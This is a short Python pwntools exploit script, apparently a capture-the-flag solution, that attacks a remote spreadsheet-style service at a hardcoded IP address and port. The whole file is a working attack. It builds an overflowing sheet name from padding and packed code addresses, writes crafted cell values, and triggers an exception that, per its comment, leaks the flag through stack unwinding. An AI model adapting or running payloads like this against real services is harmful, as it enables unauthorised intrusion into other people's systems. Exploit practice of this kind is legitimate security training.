#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.28"
host = "54.203.154.154"
port = 6655
#port = 8888
#port = 9999

def enter(name):
    r.recvuntil("sheet:")
    r.sendline(name)

def read_ceil(idx):
    r.recvuntil(">")
    r.sendline("r " + str(idx))


def write_ceil_exp(idx,op,a,b):
    r.recvuntil(">")
    r.sendline("w " + str(idx) + " " + op + str(a) + " " + str(b))

def write_ceil(idx,val):
    r.recvuntil(">")
    r.sendline("w " + str(idx) +" =" + str(val))

r = remote(host,port)



enter("a"*16 + p64(0x0000000000401939) + "b"*40 + p64(0x4019d2) + "c"*40 + p64(0x4017b0)) # Use stack unwind and error message to leak the flag.
write_ceil_exp(0,"+",8,9)
write_ceil(9,0)
read_ceil(0) # Trigger the exception
r.interactive()
